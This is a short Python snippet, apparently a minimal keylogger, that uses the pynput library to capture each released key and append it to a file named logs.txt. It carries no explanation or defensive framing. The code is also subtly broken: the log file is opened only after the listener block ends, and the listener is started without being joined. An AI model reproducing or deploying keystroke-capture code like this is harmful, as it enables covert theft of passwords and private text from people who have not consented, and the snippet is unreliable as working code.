from pynput import keyboard

def on_release(key):
    f.write(str(key))
    
with keyboard.Listener(on_release=on_release) as listener:
    listener.start()
f = open("logs.txt","a")
